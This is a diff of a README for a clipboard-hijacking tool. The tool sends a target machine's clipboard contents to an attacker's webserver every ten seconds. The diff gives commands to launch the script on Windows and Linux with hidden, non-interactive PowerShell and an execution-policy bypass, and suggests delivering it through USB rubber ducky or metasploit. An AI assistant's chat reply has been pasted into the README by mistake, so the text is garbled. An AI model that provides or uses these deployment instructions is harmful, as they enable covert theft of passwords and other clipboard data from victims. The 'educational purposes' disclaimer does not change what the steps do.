@@ -28,12 +28,21 @@ Now you can run the following command for run the server
 ```
 python3 server.py
 ```
-change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.
-```
-powershell -NoP -NonI -W h -Exec Bypass .\clipboardhijacker.ps1
-```
-after that your webserver will getting target machine clipboard data in every 10 sec.
+change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.Got it, here's the cleaned-up version with **just the updated snippet** for the **README.md**:
 
+---
+For **Linux**, use the following PowerShell command:  
+```bash
+pwsh -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ./clipboardhijacker-linux.ps1
+```
+
+For **Windows**, use the following PowerShell command:  
+```bash
+powershell -NoP -NonI -W h -Exec Bypass .\clipboardhijacker-windows.ps1
+``` 
+---
+
+Let me know if you need further tweaks! 🚀
 <b>Desclaimer: </b> this program only for pentesting & educational purposes only so don't miss use this program.
 
 ### Video Demo
